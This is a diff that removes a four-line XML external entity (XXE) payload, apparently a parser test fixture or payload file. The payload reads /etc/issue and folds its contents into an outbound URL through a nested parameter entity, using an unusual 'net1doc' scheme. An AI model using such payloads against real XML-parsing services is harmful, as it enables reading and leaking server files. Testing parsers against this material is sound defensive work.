@@ -1,4 +1,0 @@
-<!ENTITY % file SYSTEM "file:///etc/issue">
-<!ENTITY % run "<!ENTITY &#x25; exfil SYSTEM 'net1doc://https://?a=%file;'>">
-%run;
-%exfil;
